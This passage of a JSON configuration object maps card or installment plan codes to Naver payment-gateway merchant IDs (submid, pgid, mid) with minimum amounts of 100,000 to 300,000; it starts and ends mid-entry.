id":"01068","mid":"naver_order24","minamt":"300000"},"51225C010":{"submid":"naver_PG06","pgid":"51226","mid":"naver_PG06","minamt":"300000"},"51241CH10":{"submid":"naver_PG15","pgid":"51242","mid":"naver_PG15","minamt":"300000"},"51098CH10":{"submid":"naver_shoppay46","pgid":"51099","mid":"naver_shoppay46","minamt":"300000"},"51306C010":{"submid":"naver_PG52","pgid":"51312","mid":"naver_PG52","minamt":"300000"},"51071CH10":{"submid":"naver_shoppay41","pgid":"51094","mid":"naver_shoppay41","minamt":"300000"},"51217C006":{"submid":"naver_shoppay65","pgid":"51218","mid":"naver_shoppay65","minamt":"200000"},"51217C003":{"submid":"naver_shoppay65","pgid":"51218","mid":"naver_shoppay65","minamt":"100000"},"51217C002":{"submid":"naver_shoppay65","pgid":"51218","mid":"naver_shoppay65","minamt":"100000"},"51098CH06":{"submid":"naver_shoppay46","pgid":"51099","mid":"naver_shoppay46","minamt":"100000"},"51292CH06":{"submid":"naver_shoppay82","pgid":"51293","mid":"naver_shoppay82","minamt":"100000"},"01067C002":{"submid":"naver_order24","pgid":"01068","mid":"naver_order24","minamt":"100000"},"51067C010":{"submid":"naver_shoppay99","pgid":"51068","mid":"naver_shoppay99","minamt":"300000"},"51237CH06":{"submid":"naver_PG11","pgid":"51238","mid":"naver_PG11","minamt":"100000"},"01055CH06":{"submid":"naver_order16","pgid":"01056","mid":"naver_order16","minamt":"100000"},"51104C002":{"submid":"naver_shoppay54","pgid":"51105","mid":"naver_shoppay54","minamt":"100000"},"51104C003":{"submid":"naver_shoppay54","pgid":"51105","mid":"naver_shoppay54","minamt":"100000"},"51104C006":{"submid":"naver_shoppay54","pgid":"51105","mid":"naver_shoppay54","minamt":"200000"},"51237CH10":{"submid":"naver_PG11","pgid":"51238","mid":"naver_PG11","minamt":"300000"},"01063CH06":{"submid":"naver_booking14","pgid":"01064","mid":"naver_booking14","minamt":"100000"},"51267C006":{"submid":"naver_PG32","pgid":"51273","mid":"naver_PG32","minamt":"200000"},"01055CH10":{"submid":"naver_order16","pgid":"01056","mid":"naver_order16","minamt":"300000"},"51265CH06":{"submid":"naver_PG28","pgid":"51271","mid":"naver_PG28","minamt":"100000"},"51267C002":{"submid":"naver_PG32","pgid":"51273","mid":"naver_PG32","minamt":"100000"},"51267C003":{"submid":"naver_PG32","pgid":"51273","mid":"naver_PG32","minamt":"100000"},"51241CH06":{"submid":"naver_PG15","pgid":"51242","mid":"naver_PG15","minamt":"100000"},"51265CH10":{"submid":"naver_PG28","pgid":"51271","mid":"naver_PG28","minamt":"300000"},"51305C003":{"submid":"naver_PG50","pgid":"51311","mid":"naver_PG50","minamt":"100000"},"51305C006":{"submid":"naver_PG50","pgid":"51311","mid":"naver_PG50","minamt":"200000"},"51303C010":{"submid":"naver_PG46","pgid":"51309","mid":"naver_PG46","minamt":"300000"},"51305C002":{"submid":"naver_PG50","pgid":"51311","mid":"naver_PG50","minamt":"100000"},"51285CH10":{"submid":"naver_order18","pgid":"51286","mid":"naver_order18","minamt":"300000"},"51100CH06":{"submid":"naver_shoppay48","pgid":"51101","mid":"naver_shoppay48","minamt":"100000"},"51281C003":{"submid":"naver_booking12","pgid":"51282","mid":"naver_booking12","minamt":"100000"},"51281C002":{"submid":"naver_booking12","pgid":"51282","mid":"naver_booking12","minamt":"100000"},"01023C002":{"submid":"naver_shoppay02","pgid":"01024","mid":"naver_shoppay02","minamt":"100000"},"51109CH06":{"submid":"naver_shoppay60","pgid":"51110","mid":"naver_shoppay60","minamt":"100000"},"01051C010":{"submid":"naver_local02","pgid":"01052","mid":"naver_local02","minamt":"300000"},"51303C002":{"submid":"naver_PG46","pgid":"51309","mid":"naver_PG46","minamt":"100000"},"51303C003":{"submid":"naver_PG46","pgid":"51309","mid":"naver_PG46","minamt":"100000"},"51303C006":{"submid":"naver_PG46","pgid":"51309","mid":"naver_PG46","minamt":"200000"},"51100CH10":{"submid":"naver_shoppay48","pgid":"51101","mid":"naver_shoppay48","minamt":"300000"},"51305C010":{"submid":"naver_PG50","pgid":"51311","mid":"naver_PG50","minamt":"300000"},"51269C010":{"submid":"naver_PG36","pgid":"51275","mid":"naver_PG36","minamt":"300000"},"51109CH10":{"submid":"naver_shoppay60","pgid":"51110","mid":"naver_shoppay60","minamt":"300000"},"01023C010":{"submid":"naver_shoppay02","pgid":"01024","mid":"naver_shoppay02","minamt":"300000"},"51281C010":{"submid":"naver_booking12","pgid":"51282","mid":"naver_booking12","minamt":"300000"},"51263CH06":{"submid":"naver_order12","pgid":"51264","mid":"naver_order12","minamt":"100000"},"01029CH06":{"submid":"naver_shoppay26","pgid":"01030","mid":"naver_shoppay26","minamt":"100000"},"51257CH10":{"submid":"naver_local04","pgid":"51258","mid":"naver_local04","minamt":"300000"},"51257CH06":{"submid":"naver_local04","pgid":"51258","mid":"naver_local04","minamt":"100000"},"51247C006":{"submid":"naver_PG19","pgid":"51248","mid":"naver_PG19","minamt":"200000"},"01029CH10":{"submid":"naver_shoppay26","pgid":"01030","mid":"naver_shoppay26","minamt":"300000"},"51247C002":{"submid":"naver_PG19","pgid":"51248","mid":"naver_PG19","minamt":"100000"},"51247C003":{"submid":"naver_PG19","pgid":"51248","mid":"naver_PG19","minamt":"100000"},"01023C003":{"submid":"naver_shoppay02","pgid":"01024","mid":"naver_shoppay02","minamt":"100000"},"01023C006":{"submid":"naver_shoppay02","pgid":"01024","mid":"naver_shoppay02","minamt":"200000"},"01063CH10":{"submid":"naver_booking14","pgid":"01064","mid":"naver_booking14","minamt":"300000"},"51104C010":{"submid":"naver_shoppay54","pgid":"51105","mid":"naver_shoppay54","minamt":"300000"},"51281C006":{"submid":"naver_booking12","pgid":"51282","mid":"naver_booking12","minamt":"200000"},"01045C002":{"submid":"naver_booking02","pgid":"01046","mid":"naver_booking02","minamt":"100000"},"51270CH06":{"submid":"naver_PG38","pgid":"51276","mid":"naver_PG38","minamt":"100000"},"51074C006":{"submid":"naver_shoppay39","pgid":"51075","mid":"naver_shoppay39","minamt":"200000"},"51074C002":{"submid":"naver_shoppay39","pgid":"51075","mid":"naver_shoppay39","minamt":"100000"},"51296C010":{"submid":"naver_PG61","pgid":"51298","mid":"naver_PG61","minamt":"300000"},"51078CH10":{"submid":"naver_shoppay30","pgid":"51079","mid":"naver_shoppay30","minamt":"300000"},"51073C002":{"submid":"naver_shoppay43","pgid":"51096","mid":"naver_shoppay43","minamt":"100000"},"51074C003":{"submid":"naver_shoppay39","pgid":"51075","mid":"naver_shoppay39","minamt":"100000"},"51300CH06":{"submid":"naver_PG44","pgid":"51301","mid":"naver_PG44","minamt":"100000"},"51219C006":{"submid":"naver_shoppay67","pgid":"51220","mid":"naver_shoppay67","minamt":"200000"},"51219C002":{"submid":"naver_shoppay67","pgid":"51220","mid":"naver_shoppay67","minamt":"100000"},"51219C003":{"submid":"naver_shoppay67","pgid":"51220","mid":"naver_shoppay67","minamt":"100000"},"51108CH10":{"submid":"naver_shoppay61","pgid":"51111","mid":"naver_shoppay61","minamt":"300000"},"51067C006":{"submid":"naver_shoppay99","pgid":"51068","mid":"naver_shoppay99","minamt":"200000"},"51300CH10":{"submid":"naver_PG44","pgid":"51301","mid":"naver_PG44","minamt":"300000"},"51080C002":{"submid":"naver_shoppay32","pgid":"51081","mid":"naver_shoppay32","minamt":"100000"},"51253C002":{"submid":"naver_booking08","pgid":"51254","mid":"naver_booking08","minamt":"100000"},"51296C002":{"submid":"naver_PG61","pgid":"51298","mid":"naver_PG61","minamt":"100000"},"51296C003":{"submid":"naver_PG61","pgid":"51298","mid":"naver_PG61","minamt":"100000"},"51247C010":{"submid":"naver_PG19","pgid":"51248","mid":"naver_PG19","minamt":"300000"},"51074C010":{"submid":"naver_shoppay39","pgid":"51075","mid":"naver_shoppay39","minamt":"300000"},"51080C006":{"submid":"naver_shoppay32","pgid":"51081","mid":"naver_shoppay32","minamt":"200000"},"51253C006":{"submid":"naver_booking08","pgid":"51254","mid":"naver_booking08","minamt":"200000"},"51296C006":{"submid":"naver_PG61","pgid":"51298","mid":"naver_PG61","minamt":"200000"},"51067C003":{"submid":"naver_shoppay99","pgid":"51068","mid":"naver_shoppay99","minamt":"100000"},"51078CH06":{"submid":"naver_shoppay30","pgid":"51079","mid":"naver_shoppay30","minamt":"100000"},"51080C003":{"submid":"naver_shoppay32","pgid":"51081","mid":"naver_shoppay32","minamt":"100000"},"51253C003":{"submid":"naver_booking08","pgid":"51254","mid":"naver_booking08","minamt":"100000"},"51067C002":{"submid":"naver_shoppay99","pgid":"51068","mid":"naver_shoppay99","minamt":"100000"},"51221CH06":{"submid":"naver_shoppay69","pgid":"51222","mid":"naver_shoppay69","minamt":"100000"},"01051C006":{"submid":"naver_local02","pgid":"01052","mid":"naver_local02","minamt":"200000"},"01045C010":{"submid":"naver_booking02","pgid":"01046","mid":"naver_booking02","minamt":"300000"},"51279CH10":{"submid":"naver_smartstore08","pgid":"51280","mid":"naver_smartstore08","minamt":"300000"},"01051C002":{"submid":"naver_local02","pgid":"01052","mid":"naver_local02","minamt":"100000"},"01051C003":{"submid":"naver_local02","pgid":"01052","mid":"naver_local02","minamt":"100000"},"51304C006":{"submid":"naver_PG48","pgid":"51310","mid":"naver_PG48","minamt":"200000"},"51270CH10":{"submid":"naver_PG38","pgid":"51276","mid":"naver_PG38","minamt":"300000"},"51285CH06":{"submid":"naver_order18","pgid":"51286","mid":"naver_order18","minamt":"100000"},"51304C002":{"submid":"naver_PG48","pgid":"51310","mid":"naver_PG48","minamt":"100000"},"51304C003":{"submid":"naver_PG48","pgid":"51310","mid":"naver_PG48","minamt":"100000"},"51225C002":{"submid":"naver_PG06","pgid":"51226","mid":"naver_PG06","minamt":"100000"},"51225C003":{"submid":"naver_PG06","pgid":"51226","mid":"naver_PG06","minamt":"100000"},"51268C002":{"submid":"naver_PG34","pgid":"51274","mid":"naver_PG34","minamt":"100000"},"51225C006":{"submid":"naver_PG06","pgid":"51226","mid":"naver_PG06","minamt":"200000"},"51219C010":{"submid":"naver_shoppay67","pgid":"51220","mid":"naver_shoppay67","minamt":"300000"},"51221CH10":{"submid":"naver_shoppay69","pgid":"51222","mid":"naver_shoppay69","minamt":"300000"},"51080C010":{"submid":"naver_shoppay32","pgid":"51081","mid":"naver_shoppay32","minamt":"300000"},"51253C010":{"submid":"naver_booking08","pgid":"51254","mid":"naver_booking08","minamt":"300000"},"51279CH06":{"submid":"naver_smartstore08","pgid":"51280","mid":"naver_smartstore08","minamt":"100000"},"51108CH06":{"submid":"naver_shoppay61","pgid":"51111","mid":"naver_shoppay61","minamt":"100000"},"01045C006":{"submid":"naver_booking02","pgid":"01046","mid":"naver_booking02","minamt":"200000"},"51268C006":{"submid":"naver_PG34","pgid":"51274","mid":"naver_PG34","minamt":"200000"},"51268C003":{"submid":"naver_PG34","pgid":"51274","mid":"naver_PG34","minamt":"100000"},"01045C003":{"submid":"naver_booking02","pgid":"01046","mid":"naver_booking02","minamt":"100000"},"51304CH06":{"submid":"naver_PG48","pgid":"51310","mid":"naver_PG48","minamt":"100000"},"51290C006":{"submid":"naver_local_kicc04","pgid":"51291","mid":"naver_local_kicc04","minamt":"200000"},"51294CH10":{"submid":"naver_shoppay84","pgid":"51295","mid":"naver_shoppay84","minamt":"300000"},"51266C006":{"submid":"naver_PG30","pgid":"51272","mid":"naver_PG30","minamt":"200000"},"51053CH06":{"submid":"naver_shoppay07","pgid":"51054","mid":"naver_shoppay07","minamt":"100000"},"51304CH10":{"submid":"naver_PG48","pgid":"51310","mid":"naver_PG48","minamt":"300000"},"51290C010":{"submid":"naver_local_kicc04","pgid":"51291","mid":"naver_local_kicc04","minamt":"300000"},"51266C002":{"submid":"naver_PG30","pgid":"51272","mid":"naver_PG30","minamt":"100000"},"51266C003":{"submid":"naver_PG30","pgid":"51272","mid":"naver_PG30","minamt":"100000"},"51294CH06":{"submid":"naver_shoppay84","pgid":"51295","mid":"naver_shoppay84","minamt":"100000"},"51251C010":{"submid":"naver_booking04","pgid":"51252","mid":"naver_booking04","minamt":"300000"},"51300C006":{"submid":"naver_PG44","pgid":"51301","mid":"naver_PG44","minamt":"200000"},"51073C010":{"submid":"naver_shoppay43","pgid":"51096","mid":"naver_shoppay43","minamt":"300000"},"51243C010":{"submid":"naver_PG17","pgid":"51244","mid":"naver_PG17","minamt":"300000"},"01049CH06":{"submid":"naver_local_kis02","pgid":"01050","mid":"naver_local_kis02","minamt":"100000"},"51300C002":{"submid":"naver_PG44","pgid":"51301","mid":"naver_PG44","minamt":"100000"},"51300C003":{"submid":"naver_PG44","pgid":"51301","mid":"naver_PG44","minamt":"100000"},"01065CH06":{"submid":"naver_order22","pgid":"01066","mid":"naver_order22","minamt":"100000"},"51053CH10":{"submid":"naver_shoppay07","pgid":"51054","mid":"naver_shoppay07","minamt":"300000"},"51073C003":{"submid":"naver_shoppay43","pgid":"51096","mid":"naver_shoppay43","minamt":"100000"},"51073C006":{"submid":"naver_shoppay43","pgid":"51096","mid":"naver_shoppay43","minamt":"200000"},"51251C006":{"submid":"naver_booking04","pgid":"51252","mid":"naver_booking04","minamt":"200000"},"51251C003":{"submid":"naver_booking04","pgid":"51252","mid":"naver_booking04","minamt":"100000"},"51251C002":{"submid":"naver_booking04","pgid":"51252","mid":"naver_booking04","minamt":"100000"},"51307C006":{"submid":"naver_PG54","pgid":"51313","mid":"naver_PG54","minamt":"200000"},"01049CH10":{"submid":"naver_local_kis02","pgid":"01050","mid":"naver_local_kis02","minamt":"300000"},"51243C002":{"submid":"naver_PG17","pgid":"51244","mid":"naver_PG17","minamt":"100000"},"51243C003":{"submid":"naver_PG17","pgid":"51244","mid":"naver_PG17","minamt":"100000"},"51069CH10":{"submid":"naver_shoppay37","pgid":"51070","mid":"naver_shoppay37","minamt":"300000"},"51235C003":{"submid":"naver_PG09","pgid":"51236","mid":"naver_PG09","minamt":"100000"},"01057CH10":{"submid":"naver_smartstore02","pgid":"01058","mid":"naver_smartstore02","minamt":"300000"},"51297C010":{"submid":"naver_PG62","pgid":"51299","mid":"naver_PG62","minamt":"300000"},"51235C006":{"submid":"naver_PG09","pgid":"51236","mid":"naver_PG09","minamt":"200000"},"51263CH10":{"submid":"naver_order12","pgid":"51264","mid":"naver_order12","minamt":"300000"},"01029C006":{"submid":"naver_shoppay26","pgid":"01030","mid":"naver_shoppay26","minamt":"200000"},"01029C003":{"submid":"naver_shoppay26","pgid":"01030","mid":"naver_shoppay26","minamt":"100000"},"01061C002":{"submid":"naver_booking10","pgid":"01062","mid":"naver_booking10","minamt":"100000"},"51235C002":{"submid":"naver_PG09","pgid":"51236","mid":"naver_PG09","minamt":"100000"},"01061C003":{"submid":"naver_booking10","pgid":"01062","mid":"naver_booking10","minamt":"100000"},"01029C002":{"submid":"naver_shoppay26","pgid":"01030","mid":"naver_shoppay26","minamt":"100000"},"01061C006":{"submid":"naver_booking10","pgid":"01062","mid":"naver_booking10","minamt":"200000"},"51243C006":{"submid":"naver_PG17","pgid":"51244","mid":"naver_PG17","minamt":"200000"},"51072C003":{"submid":"naver_shoppay42","pgid":"51095","mid":"naver_shoppay42","minamt":"100000"},"51072C002":{"submid":"naver_shoppay42","pgid":"51095","mid":"naver_shoppay42","minamt":"100000"},"51316C006":{"submid":"naver_PG60","pgid":"51317","mid":"naver_PG60","minamt":"200000"},"51069CH06":{"submid":"naver_shoppay37","pgid":"51070","mid":"naver_shoppay37","minamt":"100000"},"51316C003":{"submid":"naver_PG60","pgid":"51317","mid":"naver_PG60","minamt":"100000"},"51307C002":{"submid":"naver_PG54","pgid":"51313","mid":"naver_PG54","minamt":"100000"},"51316C002":{"submid":"naver_PG60","pgid":"51317","mid":"naver_PG60","minamt":"100000"},"51307C003":{"submid":"naver_PG54","pgid":"51313","mid":"naver_PG54","minamt":"100000"},"51297C006":{"submid":"naver_PG62","pgid":"51299","mid":"naver_PG62","minamt":"200000"},"51297C003":{"submid":"naver_PG62","pgid":"51299","mid":"naver_PG62","minamt":"100000"},"51297C002":{"submid":"naver_PG62","pgid":"51299","mid":"naver_PG62","minamt":"100000"},"01061C010":{"submid":"naver_booking10","pgid":"01062","mid":"naver_booking10","minamt":"300000"},"51235C010":{"submid":"naver_PG09","pgid":"51236","mid":"naver_PG09","minamt":"300000"},"51107C010":{"submid":"naver_shoppay42","pgid":"51095","mid":"naver_shoppay42","minamt":"300000"},"01057CH06":{"submid":"naver_smartstore02","pgid":"01058","mid":"naver_smartstore02","minamt":"100000"},"51290C003":{"submid":"naver_local_kicc04","pgid":"51291","mid":"naver_local_kicc04","minamt":"100000"},"51316C010":{"submid":"naver_PG60","pgid":"51317","mid":"naver_PG60","minamt":"300000"},"51290C002":{"submid":"naver_local_kicc04","pgid":"51291","mid":"naver_local_kicc04","minamt":"100000"},"51265C006":{"submid":"naver_PG28","pgid":"51271","mid":"naver_PG28","minamt":"200000"},"51283C010":{"submid":"naver_booking16","pgid":"51284","mid":"naver_booking16","minamt":"300000"},"51277CH10":{"submid":"naver_smartstore06","pgid":"51278","mid":"naver_smartstore06","minamt":"300000"},"51259C010":{"submid":"naver_PG26","pgid":"51260","mid":"naver_PG26","minamt":"300000"},"51267C010":{"submid":"naver_PG32","pgid":"51273","mid":"naver_PG32","minamt":"300000"},"51265C003":{"submid":"naver_PG28","pgid":"51271","mid":"naver_PG28","minamt":"100000"},"51265C002":{"submid":"naver_PG28","pgid":"51271","mid":"naver_PG28","minamt":"100000"},"51249C002":{"submid":"naver_PG21","pgid":"51250","mid":"naver_PG21","minamt":"100000"},"51249C003":{"submid":"naver_PG21","pgid":"51250","mid":"naver_PG21","minamt":"100000"},"01043CH10":{"submid":"naver_PG02","pgid":"01044","mid":"naver_PG02","minamt":"300000"},"51249C006":{"submid":"naver_PG21","pgid":"51250","mid":"naver_PG21","minamt":"200000"},"51283C003":{"submid":"naver_booking16","pgid":"51284","mid":"naver_booking16","minamt":"100000"},"51283C002":{"submid":"naver_booking16","pgid":"51284","mid":"naver_booking16","minamt":"100000"},"51277CH06":{"submid":"naver_smartstore06","pgid":"51278","mid":"naver_smartstore06","minamt":"100000"},"51283C006":{"submid":"naver_booking16","pgid":"51284","mid":"naver_booking16","minamt":"200000"},"51060CH06":{"submid":"naver_shoppay14","pgid":"51061","mid":"naver_shoppay14","minamt":"100000"},"51239CH06":{"submid":"naver_PG13","pgid":"51240","mid":"naver_PG13","minamt":"100000"},"01053C010":{"submid":"naver_order14","pgid":"01054","mid":"naver_order14","minamt":"300000"},"51259C006":{"submid":"naver_PG26","pgid":"51260","mid":"naver_PG26","minamt":"200000"},"51259C003":{"submid":"naver_PG26","pgid":"51260","mid":"naver_PG26","minamt":"100000"},"51259C002":{"submid":"naver_PG26","pgid":"51260","mid":"naver_PG26","minamt":"100000"},"51287CH10":{"submid":"naver_order20","pgid":"51288","mid":"naver_order20","minamt":"300000"},"51072C006":{"submid":"naver_shoppay42","pgid":"51095","mid":"naver_shoppay42","minamt":"200000"},"51287CH06":{"submid":"naver_order20","pgid":"51288","mid":"naver_order20","minamt":"100000"},"51072C010":{"submid":"naver_shoppay42","pgid":"51095","mid":"naver_shoppay42","minamt":"300000"},"01053C006":{"submid":"naver_order14","pgid":"01054","mid":"naver_order14","minamt":"200000"},"51307C010":{"submid":"naver_PG54","pgid":"51313","mid":"naver_PG54","minamt":"300000"},"51245CH06":{"submid":"naver_PG23","pgid":"51246","mid":"naver_PG23","minamt":"100000"},"51082C003":{"submid":"naver_shoppay44","pgid":"51097","mid":"naver_shoppay44","minamt":"100000"},"51082C002":{"submid":"naver_shoppay44","pgid":"51097","mid":"naver_shoppay44","minamt":"100000"},"01053C002":{"submid":"naver_order14","pgid":"01054","mid":"naver_order14","minamt":"100000"},"01047C010":{"submid":"naver_booking06","pgid":"01048","mid":"naver_booking06","minamt":"300000"},"01053C003":{"submid":"naver_order14","pgid":"01054","mid":"naver_order14","minamt":"100000"},"51239CH10":{"submid":"naver_PG13","pgid":"51240","mid":"naver_PG13","minamt":"300000"},"51255CH10":{"submid":"naver_local_kis04","pgid":"51256","mid":"naver_local_kis04","minamt":"300000"},"51306C003":{"submid":"naver_PG52","pgid":"51312","mid":"naver_PG52","minamt":"100000"},"51306C002":{"submid":"naver_PG52","pgid":"51312","mid":"naver_PG52","minamt":"100000"},"51261CH06":{"submid":"naver_order10","pgid":"51262","mid":"naver_order10","minamt":"100000"},"51306C006":{"submid":"naver_PG52","pgid":"51312","mid":"naver_PG52","minamt":"200000"},"51076CH10":{"submid":"naver_shoppay28","pgid":"51077","mid":"naver_shoppay28","minamt":"300000"},"51255CH06":{"submid":"naver_local_kis04","pgid":"51256","mid":"naver_local_kis04","minamt":"100000"},"51245CH10":{"submid":"naver_PG23","pgid":"51246","mid":"naver_PG23","minamt":"300000"},"01047C003":{"submid":"naver_booking06","pgid":"01048","mid":"naver_booking06","minamt":"100000"},"01047C002":{"submid":"naver_booking06","pgid":"01048","mid":"naver_booking06","minamt":"100000"},"01065CH10":{"submid":"naver_order22","pgid":"01066","mid":"naver_order22","minamt":"300000"},"01047C006":{"submid":"naver_booking06","pgid":"01048","mid":"naver_booking06","minamt":"200000"},"51065C010":{"submid":"naver_shoppay28","pgid":"51066","mid":"naver_shoppay28","minamt":"300000"},"01069C002":{"submid":"naver_local_kicc02","pgid":"01070","mid":"naver_local_kicc02","minamt":"100000"},"01069C003":{"submid":"naver_local_kicc02","pgid":"01070","mid":"naver_local_kicc02","minamt":"100000"},"01069C006":{"submid":"naver_local_kicc02","pgid":"01070","mid":"naver_local_kicc02","minamt":"200000"},"51082C010":{"submid":"naver_shoppay44","pgid":"51097","mid":"naver_shoppay44","minamt":"300000"},"51071C003":{"submid":"naver_shoppay41","pgid":"51094","mid":"naver_shoppay41","minamt":"100000"},"51071C002":{"submid":"naver_shoppay41","pgid":"51094","mid":"naver_shoppay41","minamt":"100000"},"51223CH10":{"submid":"naver_PG04","pgid":"51224","mid":"naver_PG04","minamt":"300000"},"51302C010":{"submid":"naver_PG42","pgid":"51308","mid":"naver_PG42","minamt":"300000"},"51065C006":{"submid":"naver_shoppay28","pgid":"51066","mid":"naver_shoppay28","minamt":"200000"},"01043CH06":{"submid":"naver_PG02","pgid":"01044","mid":"naver_PG02","minamt":"100000"},"51266C010":{"submid":"naver_PG30","pgid":"51272","mid":"naver_PG30","minamt":"300000"},"51065C003":{"submid":"naver_shoppay28","pgid":"51066","mid":"naver_shoppay28","minamt":"100000"},"51076CH06":{"submid":"naver_shoppay28","pgid":"51077","mid":"naver_shoppay28","minamt":"100000"},"51065C002":{"submid":"naver_shoppay28","pgid":"51066","mid":"naver_shoppay28","minamt":"100000"},"51249C010":{"submid":"naver_PG21","pgid":"51250","mid":"naver_PG21","minamt":"300000"},"51223CH06":{"submid":"naver_PG04","pgid":"51224","mid":"naver_PG04","minamt":"100000"},"01069C010":{"submid":"naver_local_kicc02","pgid":"01070","mid":"naver_local_kicc02","minamt":"300000"},"51082C006":{"submid":"naver_shoppay44","pgid":"51097","mid":"naver_shoppay44","minamt":"200000"},"51071C010":{"submid":"naver_shoppay41","pgid":"51094","mid":"naver_shoppay41","minamt":"300000"},"51306CH10":{"submid":"naver_PG52","pgid":"51312","mid":"naver_PG52","minamt":"300000"},"51108C006":{"submid":"naver_shoppay61","pgid":"51111","mid":"naver_shoppay61","minamt":"200000"},"51221C002":{"submid":"naver_shoppay69","pgid":"51222","mid":"naver_shoppay69","minamt":"100000"},"51225CH10":{"submid":"naver_PG06","pgid":"51226","mid":"naver_PG06","minamt":"300000"},"51221C003":{"submid":"naver_shoppay69","pgid":"51222","mid":"naver_shoppay69","minamt":"100000"},"51221C006":{"submid":"naver_shoppay69","pgid":"51222","mid":"naver_shoppay69","minamt":"200000"},"51268CH10":{"submid":"naver_PG34","pgid":"51274","mid":"naver_PG34","minamt":"300000"},"01059CH06":{"submid":"naver_smartstore04","pgid":"01060","mid":"naver_smartstore04","minamt":"100000"},"51268CH06":{"submid":"naver_PG34","pgid":"51274","mid":"naver_PG34","minamt":"100000"},"51071C006":{"submid":"naver_shoppay41","pgid":"51094","mid":"naver_shoppay41","minamt":"200000"},"51225CH06":{"submid":"naver_PG06","pgid":"51226","mid":"naver_PG06","minamt":"100000"},"01067CH06":{"submid":"naver_order24","pgid":"01068","mid":"naver_order24","minamt":"100000"},"51108C002":{"submid":"naver_shoppay61","pgid":"51111","mid":"naver_shoppay61","minamt":"100000"},"51108C003":{"submid":"naver_shoppay61","pgid":"51111","mid":"naver_shoppay61","minamt":"100000"},"51292C006":{"submid":"naver_shoppay82","pgid":"51293","mid":"naver_shoppay82","minamt":"200000"},"51067CH10":{"submid":"naver_shoppay99","pgid":"51068","mid":"naver_shoppay99","minamt":"300000"},"51261CH10":{"submid":"naver_order10","pgid":"51262","mid":"naver_order10","minamt":"300000"},"51098C002":{"submid":"naver_shoppay46","pgid":"51099","mid":"naver_shoppay46","minamt":"100000"},"01055C002":{"submid":"naver_order16","pgid":"01056","mid":"naver_order16","minamt":"100000"},"51306CH06":{"submid":"naver_PG52","pgid":"51312","mid":"naver_PG52","minamt":"100000"},"51098C003":{"submid":"naver_shoppay46","pgid":"51099","mid":"naver_shoppay46","minamt":"100000"},"01055C003":{"submid":"naver_order16","pgid":"01056","mid":"naver_order16","minamt":"100000"},"51098C006":{"submid":"naver_shoppay46","pgid":"51099","mid":"naver_shoppay46","minamt":"200000"},"51098C010":{"submid":"naver_shoppay46","pgid":"51099","mid":"naver_shoppay46","minamt":"300000"},"01059CH10":{"submid":"naver_smartstore04","pgid":"01060","mid":"naver_smartstore04","minamt":"300000"},"51292C010":{"submid":"naver_shoppay82","pgid":"51293","mid":"naver_shoppay82","minamt":"300000"},"51067CH06":{"submid":"naver_shoppay99","pgid":"51068","mid":"naver_shoppay99","minamt":"100000"},"51060CH10":{"submid":"naver_shoppay14","pgid":"51061","mid":"naver_shoppay14","minamt":"300000"},"51237C010":{"submid":"naver_PG11","pgid":"51238","mid":"naver_PG11","minamt":"300000"},"01055C010":{"submid":"naver_order16","pgid":"01056","mid":"naver_order16","minamt":"300000"},"01063C010":{"submid":"naver_booking14","pgid":"01064","mid":"naver_booking14","minamt":"300000"},"01055C006":{"submid":"naver_order16","pgid":"01056","mid":"naver_order16","minamt":"200000"},"51292C002":{"submid":"naver_shoppay82","pgid":"51293","mid":"naver_shoppay82","minamt":"100000"},"51292C003":{"submid":"naver_shoppay82","pgid":"51293","mid":"naver_shoppay82","minamt":"100000"},"51237C002":{"submid":"naver_PG11","pgid":"51238","mid":"naver_PG11","minamt":"100000"},"51237C003":{"submid":"naver_PG11","pgid":"51238","mid":"naver_PG11","minamt":"100000"},"51237C006":{"submid":"naver_PG11","pgid":"51238","mid":"naver_PG11","minamt":"200000"},"51100C002":{"submid":"naver_shoppay48","pgid":"51101","mid":"naver_shoppay48","minamt":"100000"},"51303CH10":{"submid":"naver_PG46","pgid":"51309","mid":"naver_PG46","minamt":"300000"},"51100C003":{"submid":"naver_shoppay48","pgid":"51101","mid":"naver_shoppay48","minamt":"100000"},"51100C006":{"submid":"naver_shoppay48","pgid":"51101","mid":"naver_shoppay48","minamt":"200000"},"51241C003":{"submid":"naver_PG15","pgid":"51242","mid":"naver_PG15","minamt":"100000"},"51265C010":{"submid":"naver_PG28","pgid":"51271","mid":"naver_PG28","minamt":"300000"},"51241C002":{"submid":"naver_PG15","pgid":"51242","mid":"naver_PG15","minamt":"100000"},"51241C006":{"submid":"naver_PG15","pgid":"51242","mid":"naver_PG15","minamt":"200000"},"01063C003":{"submid":"naver_booking14","pgid":"01064","mid":"naver_booking14","minamt":"100000"},"01063C006":{"submid":"naver_booking14","pgid":"01064","mid":"naver_booking14","minamt":"200000"},"51241C010":{"submid":"naver_PG15","pgid":"51242","mid":"naver_PG15","minamt":"300000"},"01063C002":{"submid":"naver_booking14","pgid":"01064","mid":"naver_booking14","minamt":"100000"},"51303CH06":{"submid":"naver_PG46","pgid":"51309","mid":"naver_PG46","minamt":"100000"},"51100C010":{"submid":"naver_shoppay48","pgid":"51101","mid":"naver_shoppay48","minamt":"300000"},"51107C003":{"submid":"naver_shoppay42","pgid":"51095","mid":"naver_shoppay42","minamt":"100000"},"01051CH06":{"submid":"naver_local02","pgid":"01052","mid":"naver_local02","minamt":"100000"},"51109C010":{"submid":"naver_shoppay60","pgid":"51110","mid":"naver_shoppay60","minamt":"300000"},"51107C006":{"submid":"naver_shoppay42","pgid":"51095","mid":"naver_shoppay42","minamt":"200000"},"01045CH10":{"submid":"naver_booking02","pgid":"01046","mid":"naver_booking02","minamt":"300000"},"51107C002":{"submid":"naver_shoppay42","pgid":"51095","mid":"naver_shoppay42","minamt":"100000"},"51305CH06":{"submid":"naver_PG50","pgid":"51311","mid":"naver_PG50","minamt":"100000"},"51080CH10":{"submid":"naver_shoppay32","pgid":"51081","mid":"naver_shoppay32","minamt":"300000"},"51257C002":{"submid":"naver_local04","pgid":"51258","mid":"naver_local04","minamt":"100000"},"51257C006":{"submid":"naver_local04","pgid":"51258","mid":"naver_local04","minamt":"200000"},"51257C003":{"submid":"naver_local04","pgid":"51258","mid":"naver_local04","minamt":"100000"},"51269CH06":{"submid":"naver_PG36","pgid":"51275","mid":"naver_PG36","minamt":"100000"},"01023CH06":{"submid":"naver_shoppay02","pgid":"01024","mid":"naver_shoppay02","minamt":"100000"},"51104CH10":{"submid":"naver_shoppay54","pgid":"51105","mid":"naver_shoppay54","minamt":"300000"},"51281CH06":{"submid":"naver_booking12","pgid":"51282","mid":"naver_booking12","minamt":"100000"},"51263C006":{"submid":"naver_order12","pgid":"51264","mid":"naver_order12","minamt":"200000"},"51263C003":{"submid":"naver_order12","pgid":"51264","mid":"naver_order12","minamt":"100000"},"01029C010":{"s